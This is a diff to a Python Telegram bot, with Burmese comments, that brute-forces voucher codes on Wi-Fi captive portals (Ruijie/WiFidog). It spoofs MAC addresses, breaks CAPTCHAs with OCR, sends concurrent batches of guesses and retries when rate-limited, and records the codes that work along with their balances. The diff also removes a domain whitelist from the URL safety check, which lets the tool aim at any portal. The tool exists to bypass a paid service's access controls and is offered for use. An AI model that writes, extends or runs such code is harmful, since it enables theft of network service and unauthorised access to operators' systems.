@@ -2,7 +2,7 @@ import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uu
 from telebot.async_telebot import AsyncTeleBot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiohttp import web
-from urllib.parse import urlparse
+from urllib.parse import urlparse, urljoin
 import ipaddress
 import cv2
 import ddddocr
@@ -16,8 +16,8 @@ logger = logging.getLogger(__name__)
 # ── Environment Config ──────────────────────────────────────────────────
 BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
 ADMIN_ID    = os.environ.get("ADMIN_ID", "")
-CONCURRENCY = int(os.environ.get("CONCURRENCY", 60))   # 300 ကနေ 60 သို့လျှော့
-BATCH_SIZE  = int(os.environ.get("BATCH_SIZE", 150))   # 500 ကနေ 150 သို့လျှော့
+CONCURRENCY = int(os.environ.get("CONCURRENCY", 60))
+BATCH_SIZE  = int(os.environ.get("BATCH_SIZE", 150))
 PORT        = int(os.environ.get("PORT", 8099))
 
 if not BOT_TOKEN or not ADMIN_ID:
@@ -26,16 +26,16 @@ if not BOT_TOKEN or not ADMIN_ID:
 # ── Global Structures ──────────────────────────────────────────────────
 bot = AsyncTeleBot(BOT_TOKEN)
 
-user_data        = {}   # {chat_id: {"session_url": ...}}
-scan_tasks       = {}   # {chat_id: {"task": Task, "stop": bool, "scan_id": str}}
-success_texts    = {}   # {chat_id: [{"code", "session_id", "plan"}]}
-limited_texts    = {}   # {chat_id: [code, ...]}
-notify_setting   = {}   # {chat_id: True/False}
-last_scan_params = {}   # {chat_id: {"mode","length","target"}}
+user_data        = {}
+scan_tasks       = {}
+success_texts    = {}
+limited_texts    = {}
+notify_setting   = {}
+last_scan_params = {}
 pending_brute    = {}
-success_messages = {}   # {chat_id: message_id}
-limited_messages = {}   # {chat_id: message_id}
-chat_locks       = {}   # {chat_id: asyncio.Lock}  # Message edit conflict ကာကွယ်ရန်
+success_messages = {}
+limited_messages = {}
+chat_locks       = {}
 
 session    = None
 _connector = None
@@ -143,7 +143,7 @@ async def get_chat_lock(chat_id):
         chat_locks[chat_id] = asyncio.Lock()
     return chat_locks[chat_id]
 
-# ── SSRF guard ─────────────────────────────────────────────────────────────
+# ── SSRF guard (Domain Whitelist ဖယ်ထား) ────────────────────────────
 def is_safe_url(url: str) -> bool:
     try:
         parsed = urlparse(url)
@@ -151,11 +151,6 @@ def is_safe_url(url: str) -> bool:
             return False
         host = parsed.hostname or ""
         if not host:
-            return False
-        # Domain whitelist (ပိုလုံခြုံစေရန်)
-        allowed_domains = ["portal-as.ruijienetworks.com"]
-        if host not in allowed_domains:
-            logger.warning(f"Blocked non-whitelisted domain: {host}")
             return False
         try:
             addr = ipaddress.ip_address(host)
@@ -178,7 +173,6 @@ def _ocr_sync(image_bytes):
         return None
     gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
     blur = cv2.GaussianBlur(gray, (3, 3), 0)
-    # Adaptive threshold သုံးခြင်းဖြင့် ပိုမိုကောင်းမွန်
     thresh = cv2.adaptiveThreshold(blur, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C, cv2.THRESH_BINARY, 11, 2)
     _, buf = cv2.imencode('.png', thresh)
     return _ocr.classification(buf.tobytes()).upper()
@@ -195,6 +189,11 @@ def replace_mac(url, new_mac):
     return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
 
 async def get_session_id(session_obj, session_url, prev=None):
+    """
+    WiFidog portal URL ကနေ sessionId ကို ရယူပါ။
+    ပထမ GET request ရဲ့ redirect URL ထဲက sessionId ကို ဖမ်းယူပါတယ်။
+    """
+    # MAC address အသစ်နဲ့ အစားထိုး
     url = replace_mac(session_url, get_mac())
     headers = {
         'accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
@@ -203,10 +202,20 @@ async def get_session_id(session_obj, session_url, prev=None):
     try:
         async with session_obj.get(url, headers=headers, allow_redirects=True,
                                     timeout=aiohttp.ClientTimeout(total=10)) as req:
-            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
-            return sid.group(1) if sid else prev
+            # redirect ဖြစ်သွားတဲ့ final URL ထဲက sessionId ကို ရှာပါ
+            final_url = str(req.url)
+            logger.info(f"get_session_id final URL: {final_url}")
+            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", final_url)
+            if sid:
+                return sid.group(1)
+            # တစ်ခါတလေ sessionId က response body ထဲမှာ ပါနိုင်တယ်
+            text = await req.text()
+            sid = re.search(r'"sessionId"\s*:\s*"([a-zA-Z0-9]+)"', text)
+            if sid:
+                return sid.group(1)
+            return prev
     except Exception as e:
-        logger.debug(f"get_session_id: {e}")
+        logger.error(f"get_session_id error: {type(e).__name__}: {e}", exc_info=True)
         return prev
 
 async def Captcha_Image(session_obj, session_id):
@@ -237,21 +246,34 @@ async def Varify_Captcha(session_obj, session_id, text):
         return session_id if data.get("success") == True else None
 
 async def check_session_url(session_url):
+    """WiFidog portal URL ကို စစ်ဆေးပြီး sessionId ရနိုင်မလား စမ်းပါ။"""
     if not is_safe_url(session_url):
+        logger.warning(f"Session URL failed safety check: {session_url}")
         return False
-    headers = {'accept': 'text/html,*/*;q=0.8',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+    }
     try:
-        async with session.get(session_url, allow_redirects=False, headers=headers,
-                                timeout=aiohttp.ClientTimeout(total=10)) as first:
-            location = first.headers.get("Location", "")
-            if location and is_safe_url(location):
-                async with session.get(location, allow_redirects=False, headers=headers,
-                                        timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                    return "sessionId" in str(resp.url) or "sessionId" in location
-            return "sessionId" in str(first.url) or "sessionId" in location
+        # MAC address အသစ်နဲ့ request လုပ်ပြီး redirect ကို လိုက်ပါ
+        test_url = replace_mac(session_url, get_mac())
+        async with session.get(test_url, allow_redirects=True, headers=headers,
+                                timeout=aiohttp.ClientTimeout(total=10)) as resp:
+            final_url = str(resp.url)
+            logger.info(f"check_session_url final URL: {final_url}")
+            # final URL ထဲမှာ sessionId ပါမပါ စစ်ပါ
+            if "sessionId" in final_url:
+                logger.info("Session check: sessionId found in redirect URL")
+                return True
+            # response body ထဲမှာ sessionId ပါမပါ စစ်ပါ
+            text = await resp.text()
+            if re.search(r'"sessionId"\s*:\s*"([a-zA-Z0-9]+)"', text):
+                logger.info("Session check: sessionId found in response body")
+                return True
+            logger.warning("Session check: no sessionId found")
+            return False
     except Exception as e:
-        logger.error(f"check_session_url: {e}")
+        logger.error(f"check_session_url error: {type(e).__name__}: {e}", exc_info=True)
         return False
 
 # ── Core voucher check ─────────────────────────────────────────────────────
@@ -269,7 +291,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
     response   = None
     session_id = None
 
-    # 🔥 Optimization: Session ကို Attempt Loop အပြင်မှာ တစ်ခါပဲ ဆောက်တယ် (TCP Handshake ၃ဆသက်သာ)
     async with aiohttp.ClientSession(
         connector=_connector, connector_owner=False,
         cookie_jar=aiohttp.CookieJar(),
@@ -279,10 +300,10 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
         for attempt in range(3):
             session_id = await get_session_id(ts, session_url)
             if not session_id:
+                logger.warning(f"Failed to get session_id for code {code}, attempt {attempt+1}")
                 continue
 
             auth_code = None
-            # CAPTCHA ကြိုးစားမှု ၁၀ ကြိမ်အထိ တိုးမြှင့်
             for _ in range(10):
                 try:
                     img  = await Captcha_Image(ts, session_id)
@@ -290,9 +311,11 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     if text and await Varify_Captcha(ts, session_id, text):
                         auth_code = text
                         break
-                except Exception:
+                except Exception as e:
+                    logger.debug(f"CAPTCHA attempt failed: {e}")
                     continue
             if not auth_code:
+                logger.warning(f"Failed to solve CAPTCHA for code {code}")
                 continue
 
             if not recheck:
@@ -321,9 +344,9 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
 
             if response and 'request limited' in response:
                 logger.warning(f"Rate limited on code={code}, retrying ({attempt+1}/3)")
-                await asyncio.sleep(1.5)  # 2s ကနေ 1.5s လျှော့
+                await asyncio.sleep(1.5)
                 continue
-            break  # success or other final response
+            break
 
     if not response:
         return
@@ -341,8 +364,8 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             fetched = await get_balance(token)
             if fetched not in ("N/A", "Error"):
                 plan_str = fetched
-        except Exception:
-            pass
+        except Exception as e:
+            logger.debug(f"Balance fetch error: {e}")
 
         if chat_id not in success_texts:
             success_texts[chat_id] = []
@@ -405,7 +428,6 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id,
                 scan_tasks.pop(chat_id, None)
                 return
 
-            # BATCH_SIZE ကို 150 သို့လျှော့ပြီး Burst သက်သာစေရန်
             batch = [next(code_iter) for _ in range(BATCH_SIZE)]
 
             async def _check(code):
@@ -414,7 +436,6 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id,
 
             results = await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
 
-            # Stop signal ကို processing အလယ်မှာ စစ်ဆေးရန်
             for res in results:
                 ct = scan_tasks.get(chat_id)
                 if not ct or ct.get("scan_id") != scan_id or ct.get("stop"):
@@ -730,7 +751,7 @@ async def main():
         timeout=aiohttp.ClientTimeout(total=30),
         connector=_connector, connector_owner=False
     )
-    logger.info("🚀 Voucher Bot starting... (Optimized Version)")
+    logger.info("🚀 Voucher Bot starting... (WiFidog Portal Compatible)")
     try:
         asyncio.create_task(web_server())
         await start_polling()
